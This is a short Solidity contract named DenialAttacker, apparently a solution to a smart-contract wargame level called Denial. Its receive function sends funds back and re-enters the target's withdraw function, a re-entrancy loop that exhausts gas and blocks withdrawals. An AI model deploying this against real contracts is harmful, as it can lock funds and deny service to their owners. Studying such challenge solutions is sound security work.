// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;

interface IDenial { 
    function withdraw() external;
}

contract DenialAttacker {
  IDenial denial;

  constructor(address _address) payable {
      denial = IDenial(_address);
  }

  receive() external payable {
     address(denial).call{value: msg.value}(""); // send back the funds
     denial.withdraw(); // re-enter
  }

}
